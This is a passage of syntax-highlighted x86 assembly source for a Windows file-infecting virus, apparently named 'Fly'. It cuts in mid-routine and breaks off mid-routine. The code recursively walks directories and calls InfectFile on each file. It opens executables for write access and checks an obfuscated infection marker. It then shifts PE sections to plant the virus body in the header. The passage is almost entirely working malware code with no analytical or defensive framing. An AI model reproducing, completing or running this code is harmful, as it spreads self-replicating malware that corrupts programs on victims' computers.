    </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc5">hFind</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">EAX</span><span class="sc0">
    </span><span class="sc6">INC</span><span class="sc0">     </span><span class="sc8">EAX</span><span class="sc0">
    </span><span class="sc6">JZ</span><span class="sc0">      </span><span class="sc5">trace_previous_dir</span><span class="sc0">
  </span><span class="sc5">next_file_in_dir</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">LEA</span><span class="sc0">     </span><span class="sc8">EAX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">EDI</span><span class="sc4">]</span><span class="sc5">.WIN32_FIND_DATA.cFileName</span><span class="sc0">
    </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">EAX</span><span class="sc0">
    </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">InfectFile</span><span class="sc0">
    </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">EDI</span><span class="sc0">
    </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc5">hFind</span><span class="sc0">
    </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc8">EBX</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">_FindNextFile</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">DEC</span><span class="sc0">     </span><span class="sc8">EAX</span><span class="sc0">
    </span><span class="sc6">JZ</span><span class="sc0">      </span><span class="sc5">next_file_in_dir</span><span class="sc0">    
  </span><span class="sc5">trace_previous_dir</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">ESI</span><span class="sc0">
        </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">WipeLastDirInPath</span><span class="sc0">
        </span><span class="sc6">JC</span><span class="sc0">      </span><span class="sc5">process_current_dir</span><span class="sc0">                  
    </span><span class="sc1">; cleanup</span><span class="sc0">
    </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc5">hFind</span><span class="sc0">
    </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc8">EBX</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">_FindClose</span><span class="sc4">]</span><span class="sc0">
  </span><span class="sc5">TraceAndInfectDirectory_exit</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">RET</span><span class="sc0">
</span><span class="sc5">TraceAndInfectDirectory</span><span class="sc0"> </span><span class="sc9">ENDP</span><span class="sc0">

</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; if the last directory was successfully ripped from path string then the carry flag is set</span><span class="sc0">
</span><span class="sc1">; addionally the new path string size is returned in EAX</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; Args:</span><span class="sc0">
</span><span class="sc1">; [ESP +  4] - path buffer</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; Reserved Regs: Win32 API</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">WipeLastDirInPath</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc5">ARG_1</span><span class="sc0"> </span><span class="sc9">EQU</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ESP</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">EBX</span><span class="sc0">
    </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">ESI</span><span class="sc0">
    </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">EDI</span><span class="sc0">
    </span><span class="sc6">CLC</span><span class="sc0">
    </span><span class="sc6">CLD</span><span class="sc0">
    </span><span class="sc6">SUB</span><span class="sc0">     </span><span class="sc8">EAX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">EAX</span><span class="sc0">
    </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">EDI</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">ARG_1</span><span class="sc0">
    </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">ECX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">MAX_PATH</span><span class="sc0">
    </span><span class="sc6">REPNZ</span><span class="sc0">   </span><span class="sc6">SCASB</span><span class="sc0">
    </span><span class="sc6">STD</span><span class="sc0">
    </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">AL</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc13">"\"
</span><span class="sc0">    </span><span class="sc6">NEG</span><span class="sc0">     </span><span class="sc8">ECX</span><span class="sc0">
    </span><span class="sc6">ADD</span><span class="sc0">     </span><span class="sc8">ECX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">MAX_PATH</span><span class="sc0">
    </span><span class="sc6">REPNZ</span><span class="sc0">   </span><span class="sc6">SCASB</span><span class="sc0">
    </span><span class="sc6">TEST</span><span class="sc0">    </span><span class="sc8">ECX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ECX</span><span class="sc0">
    </span><span class="sc6">JZ</span><span class="sc0">      </span><span class="sc5">WipeLastDirInPath_exit</span><span class="sc0">
    </span><span class="sc6">REPNZ</span><span class="sc0">   </span><span class="sc6">SCASB</span><span class="sc0">
    </span><span class="sc6">TEST</span><span class="sc0">    </span><span class="sc8">ECX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ECX</span><span class="sc0">
    </span><span class="sc6">JZ</span><span class="sc0">      </span><span class="sc5">WipeLastDirInPath_exit</span><span class="sc0">
    </span><span class="sc6">CMP</span><span class="sc0">     </span><span class="sc8">ECX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">                                               </span><span class="sc1">; will result be a root path (e.g. C:\) ?</span><span class="sc0">
    </span><span class="sc6">JZ</span><span class="sc0">  </span><span class="sc5">root_path</span><span class="sc0">
    </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc10">BYTE</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">EDI</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">                                </span><span class="sc1">; set new NUL terminator</span><span class="sc0">
    </span><span class="sc6">JMP</span><span class="sc0">     </span><span class="sc9">SHORT</span><span class="sc0"> </span><span class="sc5">ret_new_str</span><span class="sc0">
  </span><span class="sc5">root_path</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc10">BYTE</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">EDI</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">2</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
  </span><span class="sc5">ret_new_str</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">LEA</span><span class="sc0">     </span><span class="sc8">EAX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ECX</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc4">]</span><span class="sc0">                                       </span><span class="sc1">; EAX -&gt; return string size</span><span class="sc0">
    </span><span class="sc6">STC</span><span class="sc0">
  </span><span class="sc5">WipeLastDirInPath_exit</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">POP</span><span class="sc0">     </span><span class="sc8">EDI</span><span class="sc0">
        </span><span class="sc6">POP</span><span class="sc0">     </span><span class="sc8">ESI</span><span class="sc0">
        </span><span class="sc6">POP</span><span class="sc0">     </span><span class="sc8">EBX</span><span class="sc0">
    </span><span class="sc6">CLD</span><span class="sc0">
    </span><span class="sc6">RET</span><span class="sc0">     </span><span class="sc2">4</span><span class="sc0">

</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; Args:</span><span class="sc0">
</span><span class="sc1">; EBX - delta</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; Reserved Regs: ALL</span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">; Returns: void</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">InfectFile</span><span class="sc0"> </span><span class="sc9">PROC</span><span class="sc0"> </span><span class="sc5">szFname</span><span class="sc0">
    </span><span class="sc9">LOCAL</span><span class="sc0">   </span><span class="sc5">hFile</span><span class="sc0">           </span><span class="sc4">:</span><span class="sc0"> </span><span class="sc5">HANDLE</span><span class="sc0">
    </span><span class="sc9">LOCAL</span><span class="sc0">   </span><span class="sc5">dwFSize</span><span class="sc0">         </span><span class="sc4">:</span><span class="sc0"> </span><span class="sc10">DWORD</span><span class="sc0">
    </span><span class="sc9">LOCAL</span><span class="sc0">   </span><span class="sc5">dwc</span><span class="sc0">             </span><span class="sc4">:</span><span class="sc0"> </span><span class="sc10">DWORD</span><span class="sc0">
    </span><span class="sc9">LOCAL</span><span class="sc0">   </span><span class="sc5">b64Bit</span><span class="sc0">          </span><span class="sc4">:</span><span class="sc0"> </span><span class="sc10">DWORD</span><span class="sc0">
    </span><span class="sc9">LOCAL</span><span class="sc0">   </span><span class="sc5">dwHdrSizeDelta</span><span class="sc0">  </span><span class="sc4">:</span><span class="sc0"> </span><span class="sc10">DWORD</span><span class="sc0">
</span><span class="sc1">;   LOCAL   dwRealHdrSize   : DWORD</span><span class="sc0">
    </span><span class="sc9">LOCAL</span><span class="sc0">   </span><span class="sc5">dwFirstSecRO</span><span class="sc0">    </span><span class="sc4">:</span><span class="sc0"> </span><span class="sc10">DWORD</span><span class="sc0">
    </span><span class="sc9">LOCAL</span><span class="sc0">   </span><span class="sc5">pFirstSecHdr</span><span class="sc0">    </span><span class="sc4">:</span><span class="sc0"> </span><span class="sc10">DWORD</span><span class="sc0">
    </span><span class="sc9">LOCAL</span><span class="sc0">   </span><span class="sc5">dwMemBlockSize</span><span class="sc0">  </span><span class="sc4">:</span><span class="sc0"> </span><span class="sc10">DWORD</span><span class="sc0">
    </span><span class="sc9">LOCAL</span><span class="sc0">   </span><span class="sc5">pVirusBody</span><span class="sc0">      </span><span class="sc4">:</span><span class="sc0"> </span><span class="sc10">DWORD</span><span class="sc0">
</span><span class="sc1">;   LOCAL   dwViriiOffset   : DWORD  ; Offset (without any Mem- or ImageBase)</span><span class="sc0">
    </span><span class="sc9">LOCAL</span><span class="sc0">   </span><span class="sc5">dwVictimBase</span><span class="sc0">    </span><span class="sc4">:</span><span class="sc0"> </span><span class="sc10">DWORD</span><span class="sc0">

    </span><span class="sc6">PUSHAD</span><span class="sc0">
    </span><span class="sc1">; -&gt; get write access to the file and map it to memory</span><span class="sc0">
    </span><span class="sc6">XOR</span><span class="sc0">     </span><span class="sc8">EAX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">EAX</span><span class="sc0">
    </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">EAX</span><span class="sc0">
    </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc5">FILE_ATTRIBUTE_NORMAL</span><span class="sc0">
    </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc5">OPEN_EXISTING</span><span class="sc0">
    </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">EAX</span><span class="sc0">
    </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc5">FILE_SHARE_WRITE</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">FILE_SHARE_READ</span><span class="sc0">
    </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc5">GENERIC_WRITE</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">GENERIC_READ</span><span class="sc0">
    </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc5">szFname</span><span class="sc0">
    </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc8">EBX</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">_CreateFile</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc5">hFile</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">EAX</span><span class="sc0">
    </span><span class="sc6">INC</span><span class="sc0">     </span><span class="sc8">EAX</span><span class="sc0">
    </span><span class="sc6">JZ</span><span class="sc0">      </span><span class="sc5">InfectFile_exit</span><span class="sc0">
    </span><span class="sc6">SUB</span><span class="sc0">     </span><span class="sc8">EAX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">EAx</span><span class="sc0">
    </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">EAX</span><span class="sc0">
    </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc5">hFile</span><span class="sc0">
    </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc8">EBX</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">_GetFileSize</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc5">dwFSize</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">EAX</span><span class="sc0">
    </span><span class="sc6">ADD</span><span class="sc0">     </span><span class="sc8">EAX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">01000h</span><span class="sc0">                                          </span><span class="sc1">; add max hdr size to size of mem</span><span class="sc0">
    </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">EAX</span><span class="sc0">
    </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc5">GMEM_FIXED</span><span class="sc0"> </span><span class="sc6">OR</span><span class="sc0"> </span><span class="sc5">GMEM_ZEROINIT</span><span class="sc0">
    </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc8">EBX</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">_GlobalAlloc</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">OR</span><span class="sc0">      </span><span class="sc8">EAX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">EAX</span><span class="sc0">
    </span><span class="sc6">JZ</span><span class="sc0">      </span><span class="sc5">cleanup_free_mem</span><span class="sc0">
    </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">ESI</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">EAX</span><span class="sc0">                                             </span><span class="sc1">; ESI -&gt; mem ptr</span><span class="sc0">
    </span><span class="sc6">SUB</span><span class="sc0">     </span><span class="sc8">EAX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">EAX</span><span class="sc0">
    </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">EAX</span><span class="sc0">
    </span><span class="sc6">LEA</span><span class="sc0">     </span><span class="sc8">EAX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">dwc</span><span class="sc0">
    </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">EAX</span><span class="sc0">
    </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc5">dwFSize</span><span class="sc0">
    </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">ESI</span><span class="sc0">
    </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc5">hFile</span><span class="sc0">
    </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc8">EBX</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">_ReadFile</span><span class="sc4">]</span><span class="sc0">
    
    </span><span class="sc1">; -&gt; get ptr to NT hdrs and check whether the file was already infect</span><span class="sc0">
    </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">EBP</span><span class="sc0">
    </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">EBP</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">EBX</span><span class="sc0">
    </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">ESI</span><span class="sc0">
    </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">GetNTHeaders</span><span class="sc0">
    </span><span class="sc6">POP</span><span class="sc0">     </span><span class="sc8">EBP</span><span class="sc0">
    </span><span class="sc6">OR</span><span class="sc0">      </span><span class="sc8">EAX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">EAX</span><span class="sc0">
    </span><span class="sc6">JZ</span><span class="sc0">      </span><span class="sc5">cleanup_free_mem</span><span class="sc0">
    </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">EDI</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">EAX</span><span class="sc0">                                             </span><span class="sc1">; EDI -&gt; NT hdrs</span><span class="sc0">
    </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">EAX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">EDI</span><span class="sc4">]</span><span class="sc5">.IMAGE_NT_HEADERS.FileHeader.PointerToSymbolTable</span><span class="sc0">
    </span><span class="sc6">ADD</span><span class="sc0">     </span><span class="sc8">EAX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">OBFUSCATION_VAL</span><span class="sc0">
    </span><span class="sc6">CMP</span><span class="sc0">     </span><span class="sc8">EAX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">FLY_TRADEMARK</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">OBFUSCATION_VAL</span><span class="sc0">
    </span><span class="sc6">JZ</span><span class="sc0">      </span><span class="sc5">cleanup_free_mem</span><span class="sc0">
    
    </span><span class="sc1">;-&gt; check for PE32+</span><span class="sc0">
    </span><span class="sc6">SUB</span><span class="sc0">     </span><span class="sc8">EAX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">EAX</span><span class="sc0">
    </span><span class="sc6">CMP</span><span class="sc0">     </span><span class="sc10">WORD</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">EDI</span><span class="sc4">]</span><span class="sc5">.IMAGE_NT_HEADERS.OptionalHeader.Magic</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">IMAGE_NT_OPTIONAL_HDR64_MAGIC</span><span class="sc0">
    </span><span class="sc6">SETZ</span><span class="sc0">    </span><span class="sc8">AL</span><span class="sc0">
    </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc5">b64Bit</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">EAX</span><span class="sc0">
    
    </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">EBX</span><span class="sc0">                                                  </span><span class="sc1">; !!! reserve unneeded delta to stack</span><span class="sc0">

    </span><span class="sc1">;-&gt; get section hdr ptr</span><span class="sc0">
    </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">EDI</span><span class="sc4">]</span><span class="sc5">.IMAGE_NT_HEADERS.FileHeader.SizeOfOptionalHeader</span><span class="sc0">
    </span><span class="sc6">LEA</span><span class="sc0">     </span><span class="sc8">EBX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">EAX</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc8">EDI</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc9">SIZEOF</span><span class="sc0"> </span><span class="sc5">IMAGE_FILE_HEADER</span><span class="sc4">]</span><span class="sc0">      </span><span class="sc1">; EBX -&gt; section hdr table ptr</span><span class="sc0">
    </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc5">pFirstSecHdr</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">EBX</span><span class="sc0">
    
    </span><span class="sc1">;</span><span class="sc0">
    </span><span class="sc1">;-&gt; infect file image</span><span class="sc0">
    </span><span class="sc1">;</span><span class="sc0">
    
    </span><span class="sc1">; -&gt; get real size of hdrs, test whether the virus body has enough space there</span><span class="sc0">
    </span><span class="sc6">SUB</span><span class="sc0">     </span><span class="sc8">EDX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">EDX</span><span class="sc0">
    </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">EAX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc9">SIZEOF</span><span class="sc0"> </span><span class="sc5">IMAGE_SECTION_HEADER</span><span class="sc0">
    </span><span class="sc6">MOVZX</span><span class="sc0">   </span><span class="sc8">ECX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">EDI</span><span class="sc4">]</span><span class="sc5">.IMAGE_NT_HEADERS.FileHeader.NumberOfSections</span><span class="sc0">
    </span><span class="sc6">MUL</span><span class="sc0">     </span><span class="sc8">ECX</span><span class="sc0">
    </span><span class="sc6">MOVZX</span><span class="sc0">   </span><span class="sc8">EDX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">EDI</span><span class="sc4">]</span><span class="sc5">.IMAGE_NT_HEADERS.FileHeader.SizeOfOptionalHeader</span><span class="sc0">
    </span><span class="sc6">LEA</span><span class="sc0">     </span><span class="sc8">EDX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">EAX</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc8">EDX</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc9">SIZEOF</span><span class="sc0"> </span><span class="sc5">IMAGE_FILE_HEADER</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">ADD</span><span class="sc0">     </span><span class="sc8">EDX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ESI</span><span class="sc4">]</span><span class="sc5">.IMAGE_DOS_HEADER.e_lfanew</span><span class="sc0">                  </span><span class="sc1">; (EDX = real size of headers)</span><span class="sc0">
</span><span class="sc1">;   MOV     dwRealHdrSize, EDX</span><span class="sc0">
    </span><span class="sc6">NEG</span><span class="sc0">     </span><span class="sc8">EDX</span><span class="sc0">
    </span><span class="sc6">ADD</span><span class="sc0">     </span><span class="sc8">EDX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">01000h</span><span class="sc0">                                           </span><span class="sc1">; EDX -&gt; delta to hdr with 0x1000 size</span><span class="sc0">
    </span><span class="sc6">CMP</span><span class="sc0">     </span><span class="sc8">EDX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">FLY_BODY_SIZE</span><span class="sc0">                                    </span><span class="sc1">; enough size in header ?</span><span class="sc0">
    </span><span class="sc6">JGE</span><span class="sc0">     </span><span class="sc10">@F</span><span class="sc0">
    </span><span class="sc6">POP</span><span class="sc0">     </span><span class="sc8">EBX</span><span class="sc0">
    </span><span class="sc6">JMP</span><span class="sc0">     </span><span class="sc5">cleanup_free_mem</span><span class="sc0">
  </span><span class="sc5">@@</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc1">; -&gt; get the RawOffset of the first section</span><span class="sc0">
    </span><span class="sc6">SUB</span><span class="sc0">     </span><span class="sc8">EDX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">EDX</span><span class="sc0">
    </span><span class="sc6">DEC</span><span class="sc0">     </span><span class="sc8">EDX</span><span class="sc0">                                                  </span><span class="sc1">; EDX -&gt; MAX_DWORD</span><span class="sc0">
    </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">EAX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">EBX</span><span class="sc0">                                             </span><span class="sc1">; EAX -&gt; first section header</span><span class="sc0">
    </span><span class="sc6">MOVZX</span><span class="sc0">   </span><span class="sc8">ECX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">EDI</span><span class="sc4">]</span><span class="sc5">.IMAGE_NT_HEADERS.FileHeader.NumberOfSections</span><span class="sc0">
  </span><span class="sc5">scan_sec_hdr_for_low_RO</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">CMP</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">EAX</span><span class="sc4">]</span><span class="sc5">.IMAGE_SECTION_HEADER.PointerToRawData</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">EDX</span><span class="sc0">
        </span><span class="sc6">JAE</span><span class="sc0">     </span><span class="sc10">@F</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">EDX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">EAX</span><span class="sc4">]</span><span class="sc5">.IMAGE_SECTION_HEADER.PointerToRawData</span><span class="sc0">
  </span><span class="sc5">@@</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">ADD</span><span class="sc0">     </span><span class="sc8">EAX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc9">SIZEOF</span><span class="sc0"> </span><span class="sc5">IMAGE_SECTION_HEADER</span><span class="sc0">                     </span><span class="sc1">; EAX += sizeof(IMAGE_SECTION_HEADER)</span><span class="sc0">
        </span><span class="sc6">LOOP</span><span class="sc0">    </span><span class="sc5">scan_sec_hdr_for_low_RO</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc5">dwFirstSecRO</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">EDX</span><span class="sc0">
        </span><span class="sc6">NEG</span><span class="sc0">     </span><span class="sc8">EDX</span><span class="sc0">
        </span><span class="sc6">ADD</span><span class="sc0">     </span><span class="sc8">EDX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">01000h</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc5">dwHdrSizeDelta</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">EDX</span><span class="sc0">
        
    </span><span class="sc6">POP</span><span class="sc0">     </span><span class="sc8">EBX</span><span class="sc0">                                                  </span><span class="sc1">; restore delta from stack -&gt; EBX        </span><span class="sc0">
    
    </span><span class="sc1">; -&gt; patch the file image, so that it'll have a SizeOfHeaders of 0x1000</span><span class="sc0">
        </span><span class="sc1">; move all sections by the calucalated delta back</span><span class="sc0">
</span><span class="sc1">;        INT     3</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">EDX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">dwFirstSecRO</span><span class="sc0">
        </span><span class="sc6">NEG</span><span class="sc0">     </span><span class="sc8">EDX</span><span class="sc0">
        </span><span class="sc6">ADD</span><span class="sc0">     </span><span class="sc8">EDX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">dwFSize</span><span class="sc0">                                         </span><span class="sc1">; EDX -&gt; mem block size</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc5">dwMemBlockSize</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">EDX</span><span class="sc0">
        </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">EDX</span><span class="sc0">
        </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc5">GMEM_FIXED</span><span class="sc0"> </span><span class="sc6">OR</span><span class="sc0"> </span><span class="sc5">GMEM_ZEROINIT</span><span class="sc0">
        </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc8">EBX</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">_GlobalAlloc</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">TEST</span><span class="sc0">    </span><span class="sc8">EAX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">EAX</span><span class="sc0">
        </span><span class="sc6">JZ</span><span class="sc0">      </span><span class="sc5">cleanup_free_mem</span><span class="sc0">
        </span><span class="sc1">; sections -&gt; memory buffer</span><span class="sc0">
        </span><span class="sc6">XCHG</span><span class="sc0">    </span><span class="sc8">EDX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">EAX</span><span class="sc0">                                             </span><span class="sc1">; EDX -&gt; mem block ptr</span><span class="sc0">
        </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc5">dwMemBlockSize</span><span class="sc0">
        </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">EDX</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">EAX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">dwFirstSecRO</span><span class="sc0">
        </span><span class="sc6">ADD</span><span class="sc0">     </span><span class="sc8">EAX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ESI</span><span class="sc0">                                             </span><span class="sc1">; EAX -&gt; ptr to first section</span><span class="sc0">
        </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">EAX</span><span class="sc0">
        </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">memcpy</span><span class="sc0">
        </span><span class="sc1">; memory buffer -&gt; new location for sections (offset + dwHdrSizeDelta)</span><span class="sc0">
